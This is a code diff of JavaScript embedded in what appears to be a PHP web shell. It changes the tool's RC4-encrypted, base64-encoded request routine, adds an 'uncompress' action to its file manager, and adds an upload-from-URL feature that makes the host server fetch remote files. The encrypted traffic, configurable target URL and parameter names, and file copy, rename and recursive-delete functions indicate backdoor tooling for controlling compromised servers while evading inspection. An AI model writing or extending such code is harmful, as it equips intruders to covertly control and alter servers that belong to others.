@@ -97,14 +97,14 @@ $code =
 		return q.join("&");
 	}
 	
-	function getData(d, t){
-		b = rc4Init(hash);
-		
+	function getData(s, m){
+		k = rc4Init(hash);
 		try {
-			if (t === "e")
-				r = euc(btoa(rc4(randStr(' . $config['rc4drop'] . ') + d, b)));
-			else
-				r = rc4(atob(d), b).substr(' . $config['rc4drop'] . ');
+			if (m === "e") {
+				//console.log(s);
+				r = euc(btoa(rc4(randStr(' . $config['rc4drop'] . ') + s, k)));
+			} else
+				r = rc4(atob(s), k).substr(' . $config['rc4drop'] . ');
 		} catch(err) {
 			r = d;
 		}
@@ -113,6 +113,7 @@ $code =
 	}
 	
 	function ajax(p, cf){
+		console.log(p);
 		var ao = {};
 		lastAjax = p;
 		ao.cf = cf;
@@ -296,6 +297,8 @@ $code =
 
 		if (a === "comp"){
 			title = "' . tText('download', 'Download') . '";
+		} else if (a === "uncomp"){
+			title = "' . tText('uncompress', 'Uncompress') . '";
 		} else if (a === "copy"){
 			title = "' . tText('copy', 'Copy') . '";
 			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td>' . mInput('uival', '') . '</td></tr>";
@@ -309,7 +312,6 @@ $code =
 				"<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr>" +
 				"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.getElementById("base").value) + "&quot;, " + n + ");\'>" + btitle + "</span></td></tr>" +
 				"</table>";
-		if (a === "comp" && s.length > 2000) ct += "<div class=\'boxresult\'>WARNING the GET request is > 2000 chars</div>";
 		show_box(title, ct);
 	}
 	
@@ -339,10 +341,11 @@ $code =
             hide_box();
             append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=filemanager&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
         } else {
-            if (a !== "rdel" && n === "") return;
-            if (a !== "copy" && a !== "rdel") o = euc(o);
-            if (a === "ren") n = d.getElementById("base").value + n;
-           
+        	if (a === "uncomp") o = "dummy" + o;
+            else if (a !== "rdel" && n === "") return;
+            else if (a !== "copy" && a !== "rdel") o = euc(o);
+            else if (a === "ren") n = d.getElementById("base").value + n;
+
             append("box", "<div id=\'mloading\' class=\'loading mini\'></div>");
             ajax("me=filemanager&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
                 remove("mloading");
@@ -361,14 +364,23 @@ $code =
 	}
 	
 	function up(){
-		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\' + targeturl + \'>" +
+		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'" + targeturl + "\'>" +
 				"<input type=\'hidden\' value=\'" + decodeURIComponent(getData("me=filemanager&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'>" +
 				"<table class=\'boxtbl\'>" +
-					"<tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr>" +
-					"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr>" +
+					"<tr><td class=\'colFit\'>' . tText('url', 'URL') . '</td><td>' . mInput('uri', '') . '</td></tr>" +
+					"<tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input id=\'upf\' name=\'upf\' value=\'\' type=\'file\' /></td></tr>" +
+					"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'upaction()\'>' . tText('go', 'Go!') . '</span></td></tr>" +
 				"</table>" +
 			 "</form>";
 		show_box("' . tText('upload', 'Upload') . '", ct);
+	}
+
+	function upaction(){
+		uri = d.getElementById("uri").value;
+		if (uri !== "")
+			processUI("reup", d.getElementById("base").value, uri);
+		else if (d.getElementById("upf").value !== "")
+			document.up.submit();
 	}
 	
 	function uiupdate(t){
